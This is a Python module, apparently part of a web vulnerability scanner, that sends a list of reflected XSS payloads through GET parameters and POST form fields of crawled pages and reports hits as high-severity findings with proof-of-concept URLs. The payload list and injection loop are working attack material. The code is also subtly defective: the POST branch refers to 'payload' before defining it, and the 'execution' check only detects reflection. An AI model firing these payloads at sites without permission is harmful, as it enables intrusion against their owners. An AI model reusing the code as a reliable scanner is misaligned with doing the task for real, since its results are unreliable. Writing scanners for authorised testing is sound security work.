# modules/xss.py
# Deep Reflected XSS Scanner – Active testing with context detection & form support
from config import HEADERS, TIMEOUT
import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode, urljoin

def scan(target_url, pages):
    """
    Performs deep reflected XSS testing across crawled pages.
    - Tests GET parameters
    - Tests POST forms (if present)
    - Uses context-aware payloads (HTML, attribute, JS)
    - Checks for actual execution (not just reflection)
    Returns list of findings with PoC URLs
    """
    findings = []
    seen_pocs = set()  # avoid duplicate PoCs

    # Multi-context payloads (increasing aggression but still safe-ish)
    payloads = [
        # HTML context
        "<script>print(1337)</script>",
        "<img src=x onerror=print(1337)>",
        "<svg onload=print(1337)>",

        # Attribute context
        "\" onfocus=print(1337) autofocus",
        "' onmouseover=print(1337)//",

        # JavaScript context
        "';print(1337);//",
        "*/print(1337)/*",
        "-print(1337)-",

        # URL / data: context
        "javascript:print(1337)",
        "data:text/html,<script>print(1337)</script>",
    ]

    def is_likely_executed(resp_text, payload):
        """Better than simple 'in' check – looks for signs of execution"""
        if payload in resp_text:
            # Common filters/escapes that break execution
            if "&lt;" in resp_text or "&#x" in resp_text or "\\u" in resp_text:
                return False
            # Look for typical print(1337) execution markers in response
            return "1337" in resp_text or "print(1337)" in resp_text
        return False

    for page_url, resp in pages:
        # === GET parameters testing ===
        parsed = urlparse(page_url)
        if parsed.query:
            params = parse_qs(parsed.query)
            for param_name in params:
                for payload in payloads:
                    new_params = params.copy()
                    new_params[param_name] = [payload]
                    test_query = urlencode(new_params, doseq=True)
                    test_url = page_url.split('?')[0] + '?' + test_query

                    try:
                        r = requests.get(test_url, headers=HEADERS, timeout=TIMEOUT, allow_redirects=True)
                        if is_likely_executed(r.text, payload):
                            poc = test_url
                            if poc not in seen_pocs:
                                seen_pocs.add(poc)
                                findings.append(
                                    f"High - Reflected XSS (GET param '{param_name}') | "
                                    f"Payload: {payload} | "
                                    f"PoC: {poc} | "
                                    f"Location: {page_url}"
                                )
                                # Stop early for this param if found (avoid noise)
                                break
                    except Exception:
                        pass

        # === POST form testing ===
        soup = BeautifulSoup(resp.text, 'html.parser')
        forms = soup.find_all('form')
        for form in forms:
            action = urljoin(page_url, form.get('action', ''))
            method = form.get('method', 'get').lower()

            if method != 'post':
                continue  # we focus on POST for deeper impact

            inputs = {}
            for inp in form.find_all(['input', 'textarea']):
                name = inp.get('name')
                if name:
                    inputs[name] = payload  # we'll rotate payloads

            for payload in payloads:
                try:
                    data = {k: payload for k in inputs}
                    r = requests.post(action, data=data, headers=HEADERS, timeout=TIMEOUT)
                    if is_likely_executed(r.text, payload):
                        poc_desc = f"POST to {action} with payload in form fields"
                        if poc_desc not in seen_pocs:
                            seen_pocs.add(poc_desc)
                            findings.append(
                                f"High - Reflected XSS (POST form) | "
                                f"Payload: {payload} | "
                                f"Action: {action} | "
                                f"Location: {page_url}"
                            )
                            break
                except Exception:
                    pass

    if not findings:
        findings.append("✅ No reflected XSS opportunities found in the crawled pages.")

    return findings
